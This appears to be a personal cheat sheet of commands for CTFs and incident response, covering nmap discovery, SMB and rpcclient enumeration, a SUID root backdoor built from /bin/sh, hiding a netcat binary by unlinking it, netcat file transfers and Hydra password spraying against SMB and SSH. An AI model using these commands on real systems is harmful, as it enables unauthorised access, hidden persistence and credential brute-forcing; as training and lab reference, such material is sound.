# Toolbox


@TODO: Add these to your toolbox!
Add references to Hydra
Vmsplice
Sudo -L


>My mission is to create a list of "goto's" for myself when I do CTF's, Incident Response, or other CyberSecurity based activities.

[Ports](#ports)

[Port Scanners](#port-scanners)

[SMB Stuff](#smb-stuff)

[Linux Goodies](#linux-goodies)

[Specifically Netcat](#specifically-netcat)

## Ports

___

## Port Scanners!

### Nmap

#### Host Discovery
`nmap --reason -sP 172.17.0.1-254`

___

## SMB Stuff!

#### enumerate shares, but you need a username
`smbclient -L 172.30.0.22 -U <username>`

#### enumerate target Windows system with rpcclient
`rpcclient 172.30.0.22 -U <username>`

#### rpcclient prompt once logged in
`rpcclient $>`

> All commands after this line will be from the `rpcclient $>` prompt, if you don't see that prompt don't progress

#### rpcclient help, type at rpcclient prompt, you will hit tab twice
`enum<tabtab>`

#### enumerating users on domain
`enumdomusers`

#### help also prints off a bunch of commands you can use
`help`

#### enumerate service info
`srvinfo`

#### enumerate information about password policies
`getdompwinfo`

#### enumerate information about user password policies
`getusrdompwinfo <RID>`


___

## Linux Goodies! 

#### create a copy of /bin/sh shell to the tmp directory and call it backdoor

`cp /bin/sh /tmp/backdoor`

#### want this file to execute as root so chmod it

`chmod 4111 /tmp/backdoor`

#### file should be red and look at the permissions they will have the SUID bit set

`ls -l backdoor`

#### /bin/sh binary attempts to stop people from gaining root access from a SETUID binary; override this setting by adding a -p option

`./backdoor -p`

#### find look for SUID root files on the system in the tmp directory by running this

`find /tmp -uid 0 -perm -4000 -print`

#### find other SUID root files on the system 

`find /bin -uid 0 -perm -4000 -print`

#### create a network listening process and unlink the executable associated with it

`cp /bin/nc /tmp/nc` copy the binary for netcat to whatever directory you want 

`unlink /tmp/nc` using the unlink command we unlink this file so it won't show up when you do the `ls -l` command

#### delete a user account

`userdel -rf <UserAccountName>`

#### check to see if you deleted said account (UID 0 because if we are adding accounts they are root, baby ;) )

`grep :0: /etc/passwd`

#### Make Linux's network card go into promiscuous mode (on/off switch)

`ip link seet eth0 promisc on`

#### Check log entries that indicates that the interface went into promiscuous mode

`dmesg | grep promisc`

#### search the current running processes for the netcat binary (could search any process I want netcat is a mere example)

`ps aux | grep /tmp/nc`

#### lsof 


### Specifically Netcat

#### Netcat: Data Transfers

##### Move file from listener back to client
listener: `nc -l -p 7777 < file`

client: `nc listenerIP 7777 > file`

##### Upload file from client to listener
listener: `nc -l -p 7777 > file`

client: `nc listenerIP 7777 < file`

#### Netcat: Port Scanning

`nc -v -w3 -z targetIP startport-endport`

### Hydra

#### Password Spraying
`hydra -L <useraccounts.txt> -P <wordlist.txt> smb://10.10.0.1` smb service, using a word list of useraccount names (maybe you get these names from account harvesting?) and a word list of possible passwords

`hydra -L <useraccounts.txt> -P <wordlist> ssh://10.10.75.1` ssh service, uwsing a word list of useraccount names, using a word list of passwords

`hydra -l <username> -p <password> ssh://10.10.75.1`  one username and one password

`hydra -l <username> -P <wordlist.txt> ssh://10.10.75.1` one user name and a password word list
